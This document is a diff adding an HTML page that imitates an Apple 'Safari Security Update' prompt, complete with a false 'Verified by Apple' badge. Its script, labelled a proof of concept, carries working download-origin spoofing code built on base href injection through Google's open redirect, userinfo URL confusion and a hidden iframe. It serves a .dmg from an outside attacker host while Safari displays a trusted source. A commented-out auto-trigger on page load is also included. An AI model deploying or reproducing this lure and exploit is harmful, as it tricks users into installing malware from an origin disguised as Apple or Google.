@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Safari Security Update</title>
+  <style>
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      padding: 3rem 2.5rem;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 1.5rem;
+      background: linear-gradient(135deg, #007AFF, #5856D6);
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.5rem;
+      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
+    }
+
+    h1 {
+      font-size: 1.75rem;
+      color: #1d1d1f;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      font-size: 1rem;
+      color: #86868b;
+      margin-bottom: 2rem;
+      line-height: 1.5;
+    }
+
+    .update-info {
+      background: #f5f5f7;
+      border-radius: 12px;
+      padding: 1.25rem;
+      margin-bottom: 1.5rem;
+      text-align: left;
+    }
+
+    .update-label {
+      font-size: 0.75rem;
+      color: #86868b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 0.5rem;
+    }
+
+    .update-name {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #1d1d1f;
+      margin-bottom: 0.25rem;
+    }
+
+    .update-meta {
+      font-size: 0.875rem;
+      color: #86868b;
+    }
+
+    .download-btn {
+      display: block;
+      width: 100%;
+      background: linear-gradient(180deg, #007AFF, #0051D5);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.4);
+    }
+
+    .download-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(0, 122, 255, 0.5);
+    }
+
+    .download-btn:active {
+      transform: translateY(0);
+    }
+
+    .security-note {
+      font-size: 0.75rem;
+      color: #86868b;
+      margin-top: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .security-badge {
+      width: 16px;
+      height: 16px;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 2rem 1.5rem;
+      }
+      h1 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">🍎</div>
+  
+  <h1>Safari Security Update</h1>
+  <p class="subtitle">
+    A critical security patch for Safari is ready to install.
+  </p>
+
+  <div class="update-info">
+    <div class="update-label">Update Package</div>
+    <div class="update-name">Safari Security Update 2024-001</div>
+    <div class="update-meta">Version 17.4.1 • 156 MB</div>
+  </div>
+
+  <button class="download-btn" id="downloadBtn">
+    Download & Install
+  </button>
+
+  <div class="security-note">
+    <svg class="security-badge" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" fill="#34C759"/>
+      <path d="M10 14L7 11L8.41 9.59L10 11.17L15.59 5.58L17 7L10 14Z" fill="white"/>
+    </svg>
+    <span>Verified by Apple</span>
+  </div>
+</div>
+
+<script>
+/*
+ * PoC: Safari Download Origin Spoofing
+ * 
+ * VULNERABILITY DESCRIPTION:
+ * Safari's download manager incorrectly attributes download origin when using
+ * redirect chains combined with base href injection. Downloads show as coming
+ * from trusted domains (e.g., google.com, apple.com) while actually being
+ * served from attacker-controlled servers.
+ * 
+ * ATTACK TECHNIQUES:
+ * 1. Base href injection → trusted domain context
+ * 2. Open redirect exploitation → google.com/url?q=
+ * 3. Redirect chain manipulation → origin misattribution
+ * 
+ * SECURITY IMPACT:
+ * - Users trust downloads showing apple.com/google.com as source
+ * - Bypasses user awareness training
+ * - File metadata shows incorrect origin
+ * - Spotlight search shows trusted source
+ */
+
+const CONFIG = {
+  // CHANGE THIS: Your attacker-controlled file URL
+  ATTACKER_FILE: 'https://1.hackeronce.com/assets/attacker.dmg',
+  
+  // What filename to show in download prompt
+  FAKE_FILENAME: 'SafariSecurityUpdate.dmg',
+  
+  // Trusted domain for spoofing (use google.com or apple.com)
+  TRUSTED_DOMAIN: 'https://www.google.com/'
+};
+
+// Primary attack method: Base href + open redirect
+function method1_baseHrefRedirect() {
+  // Inject base href to trusted domain
+  const base = document.createElement('base');
+  base.href = CONFIG.TRUSTED_DOMAIN;
+  document.head.appendChild(base);
+  
+  // Create relative URL that resolves through trusted domain's open redirect
+  const encodedUrl = encodeURIComponent(CONFIG.ATTACKER_FILE);
+  const a = document.createElement('a');
+  a.href = 'url?q=' + encodedUrl;  // Resolves to google.com/url?q=...
+  a.download = CONFIG.FAKE_FILENAME;
+  
+  // Hidden from user
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  
+  // Trigger download
+  a.click();
+  
+  // Cleanup
+  setTimeout(() => {
+    document.body.removeChild(a);
+    document.head.removeChild(base);
+  }, 100);
+  
+  console.log('[Method 1] Base href redirect triggered');
+  console.log('Safari will show download from:', CONFIG.TRUSTED_DOMAIN);
+  console.log('Actual file served from:', CONFIG.ATTACKER_FILE);
+}
+
+// Secondary attack method: Userinfo confusion
+function method2_userinfoConfusion() {
+  // Extract domain from attacker URL
+  const url = new URL(CONFIG.ATTACKER_FILE);
+  const attackerHost = url.hostname;
+  const attackerPath = url.pathname;
+  
+  // Build userinfo URL: trusted@attacker
+  const trustedDomain = CONFIG.TRUSTED_DOMAIN.replace('https://', '').replace('/', '');
+  const spoofedUrl = `https://${trustedDomain}@${attackerHost}${attackerPath}`;
+  
+  const a = document.createElement('a');
+  a.href = spoofedUrl;
+  a.download = CONFIG.FAKE_FILENAME;
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  
+  setTimeout(() => document.body.removeChild(a), 100);
+  
+  console.log('[Method 2] Userinfo confusion triggered');
+  console.log('Spoofed URL:', spoofedUrl);
+}
+
+// Tertiary method: Iframe-based redirect
+function method3_iframeRedirect() {
+  const googleRedirect = CONFIG.TRUSTED_DOMAIN + 'url?q=' + 
+                         encodeURIComponent(CONFIG.ATTACKER_FILE);
+  
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;top:-9999px;';
+  iframe.src = googleRedirect;
+  document.body.appendChild(iframe);
+  
+  console.log('[Method 3] Iframe redirect triggered');
+}
+
+// Execute attack on button click
+document.getElementById('downloadBtn').addEventListener('click', function(e) {
+  e.preventDefault();
+  
+  console.log('═══════════════════════════════════════════════════');
+  console.log('Safari Download Origin Spoofing PoC');
+  console.log('═══════════════════════════════════════════════════');
+  console.log('Trusted domain (spoofed):', CONFIG.TRUSTED_DOMAIN);
+  console.log('Attacker file (actual):', CONFIG.ATTACKER_FILE);
+  console.log('═══════════════════════════════════════════════════');
+  
+  // Try multiple methods in sequence for maximum success rate
+  method1_baseHrefRedirect();
+  
+  setTimeout(() => method2_userinfoConfusion(), 300);
+  setTimeout(() => method3_iframeRedirect(), 600);
+  
+  // Update button state
+  this.textContent = '✓ Download Started';
+  this.style.background = 'linear-gradient(180deg, #34C759, #248A3D)';
+  this.style.cursor = 'default';
+  
+  setTimeout(() => {
+    alert('Download initiated.\n\nCheck Safari Downloads (⌘⇧L) and verify:\n• Shows "From: ' + 
+          CONFIG.TRUSTED_DOMAIN.replace('https://', '').replace('/', '') + 
+          '"\n• Actual file from your attacker domain\n\nRight-click downloaded file → Get Info → "Where from:" shows trusted domain');
+  }, 500);
+});
+
+// Auto-trigger on page load (optional - remove for manual testing)
+// window.addEventListener('load', function() {
+//   setTimeout(() => document.getElementById('downloadBtn').click(), 1000);
+// });
+</script>
+
+</body>
+</html>
+
